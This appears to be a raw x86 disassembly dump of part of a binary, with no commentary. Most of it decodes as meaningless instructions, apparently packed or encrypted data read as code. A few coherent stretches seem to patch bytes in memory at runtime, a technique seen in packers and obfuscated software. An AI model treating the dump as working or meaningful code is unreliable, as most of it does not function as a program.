  4038f7:	xchg   esi,eax
  4038f8:	fldpi  
  4038fa:	sub    al,0xd1
  4038fc:	rcl    eax,cl
  4038fe:	repnz stos BYTE PTR es:[edi],al
  403900:	rcr    DWORD PTR [ebx+ebp*1-0x51fba54e],cl
  403907:	cli    
  403908:	cmp    eax,0x5db2c3d9
  40390d:	mov    al,ds:0x82460b3a
  403912:	nop
  403913:	sti    
  403914:	pop    eax
  403915:	call   0x5d36:0x9507ae58
  40391c:	retf   
  40391d:	cs mov esp,0x9cddb3db
  403923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403924:	inc    esp
  403925:	xor    al,0x25
  403927:	mov    eax,0x7722062b
  40392c:	lock pop ebp
  40392e:	aas    
  40392f:	or     edx,DWORD PTR [edx]
  403931:	or     DWORD PTR [eax+esi*1-0x176fc92],0xce19abc
  40393c:	mov    edi,0xd05894d7
  403941:	sub    al,0xd6
  403943:	ins    BYTE PTR es:[edi],dx
  403944:	popf   
  403945:	xchg   ecx,eax
  403946:	xor    al,0xea
  403948:	and    bh,al
  40394a:	out    dx,al
  40394b:	mov    WORD PTR ds:0x483ceb7e,?
  403951:	mov    ds:0xaa5a1eb,al
  403956:	push   es
  403957:	rcr    BYTE PTR [ebp+eiz*8+0x180e54a6],cl
  40395e:	cmp    BYTE PTR [edi+0x27d7a310],dh
  403964:	int    0x4a
  403966:	imul   esi,esp,0x1c41f649
  40396c:	pop    ebx
  40396d:	sbb    BYTE PTR [ecx],0xf2
  403970:	scas   al,BYTE PTR es:[edi]
  403971:	inc    al
  403973:	repz hlt 
  403975:	xchg   ecx,eax
  403976:	rcr    BYTE PTR [ecx-0x5039515],cl
  40397c:	test   BYTE PTR [edx-0x3822baec],dh
  403982:	jbe    0x40391d
  403984:	or     edx,edi
  403986:	xor    ecx,DWORD PTR [edx+eax*4-0x5842ef29]
  40398d:	es push esi
  40398f:	sbb    al,al
  403991:	sahf   
  403992:	test   eax,0xfc085ef
  403997:	test   BYTE PTR [esi],dh
  403999:	add    al,0x0
  40399b:	add    BYTE PTR [ebp-0x977b],cl
  4039a1:	call   DWORD PTR [eax-0x75]
  4039a4:	inc    ebp
  4039a5:	in     al,0x33
  4039a7:	mov    BYTE PTR [ebx],0xc7
  4039aa:	push   eax
  4039ab:	mov    eax,DWORD PTR [ebp-0x18]
  4039ae:	add    eax,0xee
  4039b3:	push   eax
  4039b4:	mov    eax,DWORD PTR [ebp-0x18]
  4039b7:	mov    eax,DWORD PTR [eax+0x198]
  4039bd:	push   DWORD PTR [eax]
  4039bf:	jmp    0x403dcd
  4039c4:	push   es
  4039c5:	js     0x403a2e
  4039c7:	repnz popa 
  4039c9:	jno    0x40395e
  4039cb:	call   0xb3ee171
  4039d0:	sbb    ch,BYTE PTR [ebx+0x1df74eed]
  4039d6:	jle    0x403a56
  4039d8:	outs   dx,DWORD PTR ds:[esi]
  4039d9:	jge    0x403a59
  4039db:	jle    0x403995
  4039dd:	call   DWORD PTR [ebx-0x70]
  4039e0:	out    dx,al
  4039e1:	or     ebx,ebp
  4039e3:	cmp    BYTE PTR [ebx+0x74],dl
  4039e6:	loop   0x403970
  4039e8:	ins    DWORD PTR es:[edi],dx
  4039e9:	sbb    eax,0x35679827
  4039ee:	inc    edx
  4039ef:	jne    0x403a00
  4039f1:	test   eax,0x3909e0e8
  4039f6:	sbb    DWORD PTR [eax+0x22cab5cd],0xb6045c1e
  403a00:	stos   BYTE PTR es:[edi],al
  403a01:	and    ecx,edx
  403a03:	fidiv  WORD PTR [esp+edi*4-0x7a676b33]
  403a0a:	das    
  403a0b:	inc    ecx
  403a0c:	xlat   BYTE PTR ds:[ebx]
  403a0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a0e:	ins    BYTE PTR es:[edi],dx
  403a0f:	xchg   BYTE PTR [ecx-0x174de285],cl
  403a15:	fmul   st,st(0)
  403a17:	or     eax,0x7528d031
  403a1c:	mov    ebx,0x762eb5c4
  403a21:	dec    esp
  403a22:	dec    ebx
  403a23:	and    DWORD PTR [ecx+eiz*8-0x3c],esi
  403a27:	push   ecx
  403a28:	push   ss
  403a29:	popa   
  403a2a:	mov    ebx,0xfc25cbe8
  403a2f:	and    eax,DWORD PTR [esi-0xb599a60]
  403a35:	daa    
  403a36:	pop    esp
  403a37:	push   cs
  403a38:	inc    ebp
  403a39:	xlat   BYTE PTR ds:[ebx]
  403a3a:	xchg   edx,eax
  403a3b:	mov    al,0x1
  403a3d:	inc    edx
  403a3e:	stos   DWORD PTR es:[edi],eax
  403a3f:	or     BYTE PTR ds:0x97e23f35,dh
  403a45:	jp     0x403a81
  403a47:	lds    edx,FWORD PTR [edx+ebx*1+0x52]
  403a4b:	imul   edi,edx,0x16
  403a4e:	rol    DWORD PTR [ebx-0x5b],1
  403a51:	sbb    BYTE PTR [ecx-0x5f],ch
  403a54:	pop    ebx
  403a55:	sub    dl,BYTE PTR [esi+eiz*4]
  403a58:	retf   0x415
  403a5b:	test   eax,0xe69cef03
  403a60:	test   edi,edi
  403a62:	mov    eax,0xce0ca2dd
  403a67:	dec    esp
  403a68:	lea    ebp,[esi]
  403a6a:	mov    ebp,0x5d552bd2
  403a6f:	dec    ecx
  403a70:	loop   0x403a18
  403a72:	sbb    dh,BYTE PTR [ecx+0xe]
  403a75:	test   dh,al
  403a77:	imul   esi,eax,0xac9794e2
  403a7d:	xchg   ecx,eax
  403a7e:	pop    ebp
  403a7f:	arpl   WORD PTR [edx+0x6fd5213f],si
  403a85:	out    dx,eax
  403a86:	cmp    eax,0xab6926b1
  403a8b:	push   0xb64ad913
  403a90:	push   es
  403a91:	cmp    al,0xd7
  403a93:	and    esi,DWORD PTR ds:0x4189f71e
  403a99:	mov    ebp,eax
  403a9b:	adc    DWORD PTR [edx+0x38c030c1],edi
  403aa1:	xlat   BYTE PTR ds:[ebx]
  403aa2:	and    eax,0x9d36f184
  403aa7:	xchg   edx,eax
  403aa8:	cli    
  403aa9:	mov    edi,0x2ca99491
  403aae:	xor    DWORD PTR [edx+0x5ae2e1db],ebp
  403ab4:	pop    ebp
  403ab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ab6:	ret    
  403ab7:	lods   eax,DWORD PTR ds:[esi]
  403ab8:	or     esi,DWORD PTR [edx-0x74]
  403abb:	pushf  
  403abc:	push   ebp
  403abd:	cwde   
  403abe:	pop    ebx
  403abf:	fidivr DWORD PTR [edi+0x29272e00]
  403ac5:	jmp    0x403b06
  403ac7:	test   al,0xd1
  403ac9:	jle    0x403a71
  403acb:	sbb    edx,0x67
  403ace:	loopne 0x403b00
  403ad0:	xor    al,0x9b
  403ad2:	test   DWORD PTR [edx],edi
  403ad4:	cmp    bl,cl
  403ad6:	push   cs
  403ad7:	adc    esp,ecx
  403ad9:	sub    eax,0xbd968772
  403ade:	dec    esp
  403adf:	test   al,0x97
  403ae1:	jbe    0x403ae7
  403ae3:	sbb    ebx,edx
  403ae5:	fbld   TBYTE PTR [eax-0x3692544a]
  403aeb:	std    
  403aec:	mov    esp,0xdbd141bf
  403af1:	not    DWORD PTR [ecx+eiz*1]
  403af4:	ficom  WORD PTR [edi]
  403af6:	sub    eax,0xa8359d06
  403afb:	scas   eax,DWORD PTR es:[edi]
  403afc:	ins    BYTE PTR es:[edi],dx
  403afd:	mov    ds:0xefe332b8,eax
  403b02:	fsubr  DWORD PTR [edi+0x6]
  403b05:	mov    edi,0xf2b63b03
  403b0a:	aas    
  403b0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b0c:	pop    ds
  403b0d:	ja     0x403b76
  403b0f:	jnp    0x403aa5
  403b11:	out    0x98,al
  403b13:	sbb    BYTE PTR [edx+0x6d3ce47f],bh
  403b19:	cld    
  403b1a:	and    ebx,DWORD PTR [esi+0x28bd148c]
  403b20:	and    DWORD PTR [ecx-0x6d],ebx
  403b23:	push   ds
  403b24:	imul   esi,DWORD PTR [esi],0xf6cbd817
  403b2a:	push   ebx
  403b2b:	add    DWORD PTR [ebx+0x780fcc58],0xcc06983d
  403b35:	out    0xf8,eax
  403b37:	adc    eax,0x34de7bd1
  403b3c:	xor    DWORD PTR [eax+edi*4-0x14],0xffffff8e
  403b41:	sub    edi,DWORD PTR [edi-0x276b5da2]
  403b47:	lahf   
  403b48:	xchg   ebp,eax
  403b49:	repz inc esi
  403b4b:	popf   
  403b4c:	pop    edx
  403b4d:	loop   0x403ade
  403b4f:	sub    edx,edx
  403b51:	es jp  0x403b0c
  403b54:	xchg   ecx,eax
  403b55:	push   edi
  403b56:	fiadd  WORD PTR [edi-0x2a]
  403b59:	push   ebx
  403b5a:	je     0x403b03
  403b5c:	in     eax,0xed
  403b5e:	mov    eax,0xa14f2d1e
  403b63:	imul   ebp,DWORD PTR [edi+ecx*4+0x7a8a72e5],0x2e
  403b6b:	xchg   edi,eax
  403b6c:	mov    ecx,0x48b2cdb4
  403b71:	xor    esp,DWORD PTR [edx+0x66]
  403b74:	call   0x2f1c:0x80cd8d7f
  403b7b:	mov    al,0xdd
  403b7d:	push   cs
  403b7e:	mov    esi,0xe3b4e45d
  403b83:	addr16 jae 0x403bae
  403b86:	cmp    DWORD PTR [ebp+0x5e],eax
  403b89:	(bad)  
  403b8a:	pop    ecx
  403b8b:	loope  0x403be2
  403b8d:	sbb    eax,DWORD PTR [esi]
  403b8f:	fistp  DWORD PTR [eax+0x77]
  403b93:	lahf   
  403b94:	les    esp,FWORD PTR [ecx-0x4d]
  403b97:	call   0x3804:0x7cec05c
  403b9e:	xor    BYTE PTR [ebx],0x21
  403ba1:	dec    edi
  403ba2:	jecxz  0x403b3f
  403ba4:	cmp    al,0xd7
  403ba6:	jge    0x403bff
  403ba8:	push   esi
  403ba9:	pop    ecx
  403baa:	mov    ecx,0x8de2a4b6
  403baf:	adc    ecx,DWORD PTR [ebp+eiz*4+0x57158c7]
  403bb6:	xlat   BYTE PTR ds:[ebx]
  403bb7:	add    dh,BYTE PTR [ebx]
  403bb9:	inc    ebx
  403bba:	daa    
  403bbb:	push   ecx
  403bbc:	mov    WORD PTR [edi+0xe],ds
  403bbf:	pop    esi
  403bc0:	adc    edx,ebp
  403bc2:	sbb    eax,0xcf2a6c1a
  403bc7:	and    al,0x44
  403bc9:	push   ebp
  403bca:	cmp    bh,BYTE PTR [ecx+0x2dbb60bb]
  403bd0:	xor    al,0x99
  403bd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bd3:	xchg   ecx,eax
  403bd4:	push   ebx
  403bd5:	xchg   edx,eax
  403bd6:	jle    0x403be7
  403bd8:	pop    ecx
  403bd9:	jmp    0xe235:0x5f14bb2c
  403be0:	mov    ds:0x42071850,al
  403be5:	cmp    esp,ebp
  403be7:	ror    BYTE PTR [edi-0x4f],0x81
  403beb:	repz xchg ecx,eax
  403bed:	push   eax
  403bee:	push   cs
  403bef:	push   ecx
  403bf0:	push   0x6c080396
  403bf5:	pop    esp
  403bf6:	cmp    eax,0x8cfee964
  403bfb:	push   cs
  403bfc:	fist   WORD PTR [ecx+0x6a4b7c62]
  403c02:	or     eax,0x88b0f392
  403c07:	mov    al,fs:0x1c315da
  403c0d:	add    al,0xb3
  403c0f:	(bad)  [edx+eax*4+0x68]
  403c13:	outs   dx,BYTE PTR ds:[esi]
  403c14:	and    BYTE PTR [esp+edx*2-0x4f],cl
  403c18:	je     0x403c61
  403c1a:	ror    DWORD PTR [ebx-0x34],0x67
  403c1e:	mov    bl,0xe7
  403c20:	xchg   esp,eax
  403c21:	or     al,0xce
  403c23:	and    bh,BYTE PTR [esi+0x56]
  403c26:	popa   
  403c27:	js     0x403bf5
  403c29:	or     dh,bl
  403c2b:	or     DWORD PTR [eax+ebx*4+0x44],ebp
  403c2f:	fld    TBYTE PTR ds:0xd7b23d5
  403c35:	jne    0x403c23
  403c37:	fwait
  403c38:	lods   al,BYTE PTR ds:[esi]
  403c39:	cs jg  0x403c89
  403c3c:	jge    0x403c00
  403c3e:	aaa    
  403c3f:	and    ebp,DWORD PTR [ebx+0x26ccbef]
  403c45:	jns    0x403c73
  403c47:	inc    ecx
  403c48:	bound  edi,QWORD PTR [edx]
  403c4a:	aas    
  403c4b:	jno    0x403bd0
  403c4d:	call   FWORD PTR [eax]
  403c4f:	add    esi,edi
  403c51:	and    ecx,edx
  403c53:	nop
  403c54:	ret    0x1889
  403c57:	fwait
  403c58:	ins    BYTE PTR es:[edi],dx
  403c59:	stc    
  403c5a:	adc    edi,DWORD PTR [edi+eax*8]
  403c5d:	xor    eax,0xe9042f47
  403c62:	mov    ebx,DWORD PTR [edi]
  403c64:	shr    BYTE PTR [eax-0x5cf6cc1a],cl
  403c6a:	and    DWORD PTR [ecx],ecx
  403c6c:	mov    ebp,0x7f95e38b
  403c71:	jb     0x403c49
  403c73:	mov    bl,0x20
  403c75:	sub    DWORD PTR [ecx+0x15],esi
  403c78:	push   edx
  403c79:	dec    esi
  403c7a:	jns    0x403c89
  403c7c:	pop    ebx
  403c7d:	pop    ds
  403c7e:	into   
  403c7f:	aas    
  403c80:	aas    
  403c81:	int    0x45
  403c83:	in     al,dx
  403c84:	lods   eax,DWORD PTR ds:[esi]
  403c85:	mov    al,0x7
  403c87:	pop    ebx
  403c88:	pop    eax
  403c89:	out    dx,al
  403c8a:	(bad)  [edx+0x105d5ab7]
  403c90:	xchg   ebp,eax
  403c91:	shl    cl,1
  403c93:	dec    esp
  403c94:	fnstsw WORD PTR [ebx-0x35bfa985]
  403c9a:	xchg   esi,eax
  403c9b:	pop    esp
  403c9c:	cs cmp bh,cl
  403c9f:	add    edx,edi
  403ca1:	adc    bh,BYTE PTR [esi-0x4386c4c2]
  403ca7:	fsub   DWORD PTR cs:[ecx+0x408c2605]
  403cae:	jg     0x403cf6
  403cb0:	add    DWORD PTR [edx],edx
  403cb2:	mov    ch,0x49
  403cb4:	inc    ecx
  403cb5:	jae    0x403ccf
  403cb7:	dec    edx
  403cb8:	and    eax,0xbbc4d85b
  403cbd:	mov    al,0xf5
  403cbf:	test   DWORD PTR [ebx-0x76ab82f3],edx
  403cc5:	clc    
  403cc6:	clc    
  403cc7:	loop   0x403d1a
  403cc9:	add    esp,DWORD PTR [ecx-0x30]
  403ccc:	jae    0x403c93
  403cce:	xchg   edx,eax
  403ccf:	push   0xffffffea
  403cd1:	lods   eax,DWORD PTR ds:[esi]
  403cd2:	push   es
  403cd3:	in     eax,0xc2
  403cd5:	mov    bl,bl
  403cd7:	mov    eax,0xba29a636
  403cdc:	ja     0x403c85
  403cde:	and    edx,ecx
  403ce0:	add    ecx,DWORD PTR [edx]
  403ce2:	popa   
  403ce3:	jb     0x403cdf
  403ce5:	lock mov ds:0xab3eb397,eax
  403ceb:	xor    BYTE PTR [edx],ah
  403ced:	addr16 mov esi,0xa84355ad
  403cf3:	push   es
  403cf4:	outs   dx,BYTE PTR ss:[esi]
  403cf6:	data16 or BYTE PTR [ebp-0x28dd7975],al
  403cfd:	mov    ds:0x62a2b4b8,eax
  403d02:	aad    0x6e
  403d04:	mov    bl,0xa8
  403d06:	jle    0x403cef
  403d08:	xor    eax,0x289e5a27
  403d0d:	aam    0x7c
  403d0f:	into   
  403d10:	test   DWORD PTR [ecx],ebp
  403d12:	xor    edi,DWORD PTR [edx+0x54764f81]
  403d18:	(bad)  
  403d19:	jno    0x403ce7
  403d1b:	and    al,0xd9
  403d1d:	cdq    
  403d1e:	int    0xbd
  403d20:	aaa    
  403d21:	pop    ebx
  403d22:	repz add DWORD PTR [ebx+0x4d060743],edi
  403d29:	int3   
  403d2a:	mul    DWORD PTR [eax]
  403d2c:	fidiv  DWORD PTR [esi+eax*2+0x234ba6f0]
  403d33:	jge    0x403d89
  403d35:	jne    0x403cba
  403d37:	popa   
  403d38:	sub    al,0x28
  403d3a:	pusha  
  403d3b:	mov    ch,0xda
  403d3d:	mov    cl,0x51
  403d3f:	imul   ecx,DWORD PTR [ebx-0x4d],0x4eeb2daa
  403d46:	push   ecx
  403d47:	rol    BYTE PTR [ecx+0x19],1
  403d4a:	lock repz or bl,BYTE PTR [esi+0x2c]
  403d4f:	mov    cl,0xe4
  403d51:	cmp    DWORD PTR [eax-0x5c],eax
  403d54:	xchg   BYTE PTR [eax-0x3a],dh
  403d57:	or     dl,bh
  403d59:	loopne 0x403d48
  403d5b:	xlat   BYTE PTR ds:[ebx]
  403d5c:	js     0x403d75
  403d5e:	sub    DWORD PTR [ebx+0x6],ecx
  403d61:	dec    ebx
  403d62:	sub    eax,0xd7e32ab7
  403d67:	and    esp,edx
  403d69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d6a:	pushf  
  403d6b:	inc    ecx
  403d6c:	xchg   esi,eax
  403d6d:	push   0xffffffbe
  403d6f:	lods   al,BYTE PTR ds:[esi]
  403d70:	popa   
  403d71:	scas   al,BYTE PTR es:[edi]
  403d72:	jbe    0x403daf
  403d74:	adc    al,0xb6
  403d76:	mov    dh,BYTE PTR [edx]
  403d78:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d7a:	(bad)  
  403d7c:	aam    0xda
  403d7e:	leave  
  403d7f:	push   esi
  403d80:	and    cl,dh
  403d82:	(bad)  
  403d83:	test   al,0xd2
  403d85:	sub    ebx,ecx
  403d87:	xchg   esi,eax
  403d89:	ja     0x403db3
  403d8b:	arpl   WORD PTR [esi],bx
  403d8d:	cmp    edx,DWORD PTR ds:0xf755d8a1
  403d93:	jl     0x403d4e
  403d95:	in     eax,dx
  403d96:	je     0x403d23
  403d98:	pop    DWORD PTR [eax]
  403d9a:	or     eax,0xb1191d8a
  403d9f:	mov    ebp,0x9675ee8b
  403da4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403da5:	js     0x403db5
  403da7:	mov    ch,0xef
  403da9:	cdq    
  403daa:	int    0x64
  403dac:	stc    
  403dad:	push   eax
  403dae:	ins    BYTE PTR es:[edi],dx
  403daf:	add    eax,0xb1b7b294
  403db4:	sbb    cl,BYTE PTR [ebx-0x4d]
  403db7:	iret   
  403db8:	div    BYTE PTR [ebp+0x54]
  403dbb:	sbb    DWORD PTR [esi+edx*1],0xc2a1d688
  403dc2:	push   ds
  403dc3:	xor    al,0xa8
  403dc5:	mov    al,ds:0x5a1bf281
  403dca:	push   edi
  403dcb:	aas    
  403dcc:	(bad)  
  403dcd:	call   0x40c099
  403dd2:	mov    ecx,DWORD PTR [ebp-0x28]
  403dd5:	xor    ecx,esi
  403dd7:	mov    eax,0xffcd8d65
  403ddc:	sub    eax,ecx
  403dde:	sub    eax,DWORD PTR [ebp-0x4]
  403de1:	mov    ecx,DWORD PTR [ebp-0x48]
  403de4:	add    ecx,eax
  403de6:	mov    eax,DWORD PTR [ebp-0x4]
  403de9:	mov    DWORD PTR [eax+0x1],ecx
  403dec:	mov    al,BYTE PTR [ebp-0x11]
  403def:	mov    ecx,DWORD PTR [ebp-0x4]
  403df2:	xor    al,0x46
  403df4:	sub    al,0x38
  403df6:	mov    BYTE PTR [ecx],al
  403df8:	lea    eax,[ebp-0x4]
  403dfb:	inc    BYTE PTR [eax]
  403dfd:	inc    eax
  403dfe:	push   eax
  403dff:	pop    ecx
  403e00:	dec    ecx
  403e01:	jmp    0x40420f
  403e06:	dec    esp
  403e07:	repz repz adc esi,DWORD PTR [ecx+0x13]
  403e0c:	ins    BYTE PTR es:[edi],dx
  403e0d:	jno    0x403e09
  403e0f:	in     eax,0x73
  403e11:	sbb    DWORD PTR [ebp+0x3],ecx
  403e14:	jbe    0x403df5
  403e16:	in     al,0x19
  403e18:	jle    0x403e98
  403e1a:	outs   dx,DWORD PTR ds:[esi]
  403e1b:	jge    0x403e9b
  403e1d:	jle    0x403e1f
  403e1f:	push   edi
  403e20:	sahf   
  403e21:	mov    eax,ds:0x36c32d3f
  403e26:	xor    DWORD PTR [ebp+0x34],eax
  403e29:	xchg   DWORD PTR [eax-0x2d65c9f0],ecx
  403e2f:	sbb    al,0x99
  403e31:	fs push edi
  403e33:	dec    ebx
  403e34:	shr    DWORD PTR [ebx+0x4f26706b],cl
  403e3a:	xor    BYTE PTR [ebx-0x3e],bl
  403e3d:	arpl   WORD PTR [edi],bx
  403e3f:	iret   
  403e40:	add    eax,DWORD PTR [ebp-0x3265b277]
  403e46:	aas    
  403e47:	es mov bh,0x67
  403e4a:	lds    ecx,FWORD PTR [ebx+0x14194e0d]
  403e50:	shl    ecx,0xa
  403e53:	pop    esi
  403e54:	out    0x5c,al
  403e56:	data16 mov al,ds:0x4a7f8233
  403e5c:	sub    DWORD PTR [ecx+eax*8+0x5df98f95],ecx
  403e63:	jo     0x403e64
  403e65:	sar    BYTE PTR [eax],0xf3
  403e68:	sub    eax,0x5d68983
  403e6d:	inc    edx
  403e6e:	enter  0xf5fd,0x85
  403e72:	pop    es
  403e73:	xchg   edi,eax
  403e74:	inc    edx
  403e75:	dec    ebx
  403e76:	pop    es
  403e77:	(bad)  
  403e78:	sub    BYTE PTR [eax-0x21],al
  403e7b:	in     al,dx
  403e7c:	and    bh,BYTE PTR [edi-0x3e9c7d9d]
  403e82:	mov    dl,0x9f
  403e84:	inc    edx
  403e85:	xchg   esi,eax
  403e86:	xchg   ecx,eax
  403e87:	fcom   DWORD PTR [ebp-0x79]
  403e8a:	mov    ds:0x2a2bf9a1,eax
  403e8f:	pop    edx
  403e90:	mov    esi,0xfa1c2906
  403e95:	xor    al,0x19
  403e97:	sub    edi,DWORD PTR [ebx+edx*4]
  403e9a:	dec    ecx
  403e9b:	leave  
  403e9c:	push   cs
  403e9d:	dec    eax
  403e9e:	push   ebx
  403e9f:	xchg   edi,eax
  403ea0:	xchg   esp,eax
  403ea1:	call   0xebf196b1
  403ea6:	mov    ecx,0x3b3c584e
  403eab:	hlt    
  403eac:	rcl    DWORD PTR [ebx+0x2c3eaa54],1
  403eb2:	push   0xd8d754bc
  403eb7:	sti    
  403eb8:	(bad)  
  403eba:	jns    0x403f1c
  403ebc:	cld    
  403ebd:	dec    esi
  403ebe:	mov    ds:0xe87ca451,al
  403ec3:	popa   
  403ec4:	pop    ds
  403ec5:	pop    esi
  403ec6:	dec    eax
  403ec7:	and    BYTE PTR es:[edi+0x51],al
  403ecb:	push   ebx
  403ecc:	es mov dh,0xb
  403ecf:	push   es
  403ed0:	jp     0x403ef9
  403ed2:	adc    BYTE PTR [ecx-0x66fffd5e],bl
  403ed8:	retf   0x6b12
  403edb:	ins    BYTE PTR es:[edi],dx
  403edc:	ins    BYTE PTR es:[edi],dx
  403edd:	sbb    ebx,DWORD PTR [ecx+ecx*8]
  403ee0:	pop    ds
  403ee1:	xchg   DWORD PTR [ecx],ecx
  403ee3:	sub    eax,0x3c24c2bb
  403ee8:	arpl   cx,ax
  403eea:	mov    DWORD PTR [esp+edx*4-0x6],edx
  403eee:	std    
  403eef:	and    DWORD PTR [esi],ecx
  403ef1:	(bad)  
  403ef2:	shl    DWORD PTR [ecx-0x71],cl
  403ef5:	aam    0xac
  403ef7:	popf   
  403ef8:	sub    DWORD PTR ds:0x4182b778,0x841456e5
  403f02:	sbb    al,0x68
  403f04:	and    eax,0x6fdb9f6d
  403f09:	dec    ecx
  403f0a:	fild   QWORD PTR [edx]
  403f0c:	fstp   TBYTE PTR ds:0x2cf49b1d
  403f12:	adc    dl,BYTE PTR [eax]
  403f14:	xlat   BYTE PTR ds:[ebx]
  403f15:	mov    fs,WORD PTR [ebx]
  403f17:	jne    0x403f75
  403f19:	(bad)  
  403f1b:	push   edi
  403f1c:	lea    esi,[eax]
  403f1e:	mov    esp,0xa9043b
  403f23:	add    ebx,DWORD PTR [ebx]
  403f25:	push   0x740f0b4d
  403f2a:	jl     0x403fa5
  403f2c:	imul   ebx,DWORD PTR [edi],0xbba19ab7
  403f32:	int3   
  403f33:	mov    dh,0xf6
  403f35:	lods   eax,DWORD PTR ds:[esi]
  403f36:	mov    dh,BYTE PTR [eax]
  403f38:	add    BYTE PTR [esi-0x1f],cl
  403f3b:	in     al,dx
  403f3c:	imul   esi,DWORD PTR [esi],0x24746268
  403f42:	push   0xffffffd6
  403f44:	xchg   esp,eax
  403f45:	hlt    
  403f46:	outs   dx,DWORD PTR ds:[esi]
  403f47:	dec    ebp
  403f48:	pushf  
  403f49:	popf   
  403f4a:	inc    esp
  403f4b:	ror    DWORD PTR [edx+0xd86bcc3],0xf3
  403f52:	mov    al,ds:0x85acfa2d
  403f57:	mov    ecx,0xe2dc5586
  403f5c:	retf   0xed44
  403f5f:	fsub   QWORD PTR [ecx+0x2852d732]
  403f65:	inc    edx
  403f66:	cmp    DWORD PTR [ecx-0x21214c63],0xffffff99
  403f6d:	adc    eax,0xf2355aac
  403f72:	pushf  
  403f73:	mov    esi,0xaabf467e
  403f78:	adc    dh,ah
  403f7a:	push   ds
  403f7b:	ret    0x5b3b
  403f7e:	adc    DWORD PTR [edi],esi
  403f80:	inc    ecx
  403f81:	arpl   WORD PTR [ecx-0xc38fa8f],ax
  403f87:	or     eax,0x8c9d8dfa
  403f8c:	push   0x42
  403f8e:	xchg   ebp,eax
  403f8f:	aam    0x78
  403f91:	push   0x670b94fb
  403f96:	cmp    BYTE PTR [eax+0x58b9c72d],dl
  403f9c:	cli    
  403f9d:	jns    0x403f85
  403f9f:	les    edi,FWORD PTR gs:[eax+0x74]
  403fa3:	aad    0x74
  403fa5:	mov    ds:0xad86b34b,al
  403faa:	sbb    BYTE PTR [esi+0x65],ch
  403fad:	push   edx
  403fae:	(bad)  
  403faf:	mov    ch,0x5a
  403fb1:	es sti 
  403fb3:	retf   
  403fb4:	(bad)  
  403fb5:	sti    
  403fb6:	cmp    bh,0x69
  403fb9:	fwait
  403fba:	mov    al,0x26
  403fbc:	sub    BYTE PTR ds:0x637946c,ah
  403fc2:	ins    BYTE PTR es:[edi],dx
  403fc3:	stos   DWORD PTR es:[edi],eax
  403fc4:	icebp  
  403fc5:	rsm    
  403fc7:	cwde   
  403fc8:	leave  
  403fc9:	pop    edx
  403fca:	push   ebx
  403fcb:	jnp    0x403fcc
  403fcd:	or     BYTE PTR [ecx-0x58f282bc],bl
  403fd3:	ds retf 0x95d1
  403fd7:	pop    es
  403fd8:	iret   
  403fd9:	jne    0x403feb
  403fdb:	ret    
  403fdc:	cdq    
  403fdd:	inc    esi
  403fde:	add    BYTE PTR [eax-0x4fe83f3f],bh
  403fe4:	aad    0x79
  403fe6:	sub    eax,0xea92b1c8
  403feb:	int    0xd1
  403fed:	mov    dh,0x38
  403fef:	outs   dx,DWORD PTR ds:[esi]
  403ff0:	push   ss
  403ff1:	and    eax,0xb0dd322e
  403ff6:	mov    ebx,0xc901a99
  403ffb:	mov    ebp,0xf5e3490e
  404000:	mov    edx,0x264b2454
  404005:	test   al,0x4e
  404007:	xor    al,BYTE PTR [edi+0x79]
  40400a:	xor    ebp,0xffffff99
  40400d:	call   0x2432:0x84237aa0
  404014:	xor    eax,0x9b3084df
  404019:	sahf   
  40401a:	clc    
  40401b:	dec    ebx
  40401c:	cmp    al,0x8a
  40401e:	sbb    eax,0xf450697a
  404023:	fcom   QWORD PTR [eax-0x67f9a383]
  404029:	fcmovbe st,st(7)
  40402b:	pop    edi
  40402c:	imul   edx,DWORD PTR [edx],0x700c56ba
  404032:	xchg   ecx,eax
  404033:	out    dx,eax
  404034:	repnz adc DWORD PTR [esi-0x5b],ebp
  404038:	or     bh,BYTE PTR [eax-0x28]
  40403b:	loopne 0x403fca
  40403d:	xor    eax,DWORD PTR [ebx]
  40403f:	sbb    eax,DWORD PTR [edi-0x7e]
  404042:	and    al,0x18
  404044:	out    dx,al
  404045:	loop   0x40400a
  404047:	cmp    ecx,0x2d82c3d1
  40404d:	and    ebp,DWORD PTR [ebx]
  40404f:	mov    eax,0x6dca546f
  404054:	lods   eax,DWORD PTR ds:[esi]
  404055:	in     eax,0xec
  404057:	js     0x4040d5
  404059:	sub    eax,0xb7fb9fd
  40405e:	mov    al,ds:0xd94a9a70
  404063:	xor    al,0xde
  404065:	xor    esi,ebx
  404067:	jmp    0x404097
  404069:	adc    al,0x1d
  40406b:	cmp    DWORD PTR ss:[edi],ecx
  40406e:	test   al,dl
  404070:	call   0x1e84:0x17be578e
  404077:	(bad)  
  404078:	adc    eax,0xda0b1e2c
  40407d:	das    
  40407e:	fs jmp 0x4040e0
  404081:	and    al,0x54
  404083:	xor    BYTE PTR [edx+0x4d],ah
  404086:	out    dx,al
  404087:	(bad)  
  404088:	or     bh,BYTE PTR [edx+0x734395de]
  40408e:	mov    WORD PTR [ebx-0x10],?
  404091:	xchg   edi,eax
  404092:	push   ecx
  404093:	ror    DWORD PTR [ebx-0x5f],cl
  404096:	pop    ebx
  404097:	lea    esp,[ebx+0x1f]
  40409a:	or     cl,dl
  40409c:	(bad)  
  40409e:	adc    edx,DWORD PTR [edx-0x1f234b38]
  4040a4:	dec    eax
  4040a5:	pop    ebp
  4040a6:	test   BYTE PTR [eax+0x16],0x75
  4040aa:	xchg   ebp,eax
  4040ab:	adc    DWORD PTR ss:[ecx],0xfffffff1
  4040af:	xor    eax,0x5f383cfd
  4040b4:	loope  0x404056
  4040b6:	adc    BYTE PTR [ebp-0x55],0xd3
  4040ba:	xor    eax,0xcd9371d4
  4040bf:	int    0x5e
  4040c1:	mov    bh,0x19
  4040c3:	arpl   WORD PTR [edi-0x2a1ba7b8],bp
  4040c9:	sub    cl,BYTE PTR [esi-0x78]
  4040cc:	and    eax,0xb5bfe469
  4040d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040d2:	mov    bx,0x559d
  4040d6:	cmp    eax,DWORD PTR [ebp-0x22]
  4040d9:	pop    eax
  4040da:	jne    0x40414a
  4040dc:	xor    eax,ebp
